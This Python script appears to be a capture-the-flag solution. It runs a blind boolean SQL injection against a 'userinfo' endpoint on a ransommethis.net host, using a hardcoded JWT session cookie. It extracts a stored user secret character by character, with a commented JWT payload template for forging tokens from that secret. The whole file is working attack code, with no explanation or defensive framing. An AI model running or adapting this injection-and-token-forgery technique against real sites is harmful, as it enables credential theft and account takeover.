import requests

UID = 45863

'''
header = {
  "typ": "JWT",
  "alg": "HS256"
}

payload = {
  "iat": 1660520453,
  "exp": 2145916800,
  "sec": next_sec,
  "uid": UID
}
'''

example_secret = "m5ehCyJiYpRRSI2DMQWhNM1jIIE1HiuW"

alphabet = 'abcdefghijklmnopqrstuvwxyz'
numbers = '0123456789'
all_chars = alphabet + numbers

full_secret = ""
url = "https://clloahayjtqaztvg.ransommethis.net/mhqtyrypxgtseywu/userinfo?user="
s = requests.Session()

for i in range(1, len(example_secret)+1):
    for char in all_chars:
        injection = f"NiceOttoman%27%20AND%20LOWER(SUBSTR(a.secret,%20{i},%201))==%27{char}%27--"
        next_url = url + injection
        res = s.get(next_url, cookies={'tok': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzE4MjIxMjQsImV4cCI6MTY3NDQxNDEyNCwidWlkIjozNjgyOCwic2VjIjoibTVlaEN5SmlZcFJSU0kyRE1RV2hOTTFqSUlFMUhpdVcifQ.ptqwBRQwjumPUcChYEHV1HfZgPOH8AcxWxE_nf9YNzA'})
    
        if res.text.split("Users Helped:")[1].split("</p>")[0].split("<p>")[1].strip() != "":
            if char in alphabet:
                injection = f"NiceOttoman%27%20AND%20SUBSTR(a.secret,%20{i},%201)==%27{char}%27--"
                next_url = url + injection
                res = s.get(next_url, cookies={'tok': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzE4MjIxMjQsImV4cCI6MTY3NDQxNDEyNCwidWlkIjozNjgyOCwic2VjIjoibTVlaEN5SmlZcFJSU0kyRE1RV2hOTTFqSUlFMUhpdVcifQ.ptqwBRQwjumPUcChYEHV1HfZgPOH8AcxWxE_nf9YNzA'})
                if res.text.split("Users Helped:")[1].split("</p>")[0].split("<p>")[1].strip() != "":
                    full_secret += char
                else:
                    full_secret += char.upper()
            else:
                full_secret += char

            print(f"Found next char: {full_secret[-1]}")
            break
print(f"Final secret: {full_secret}")
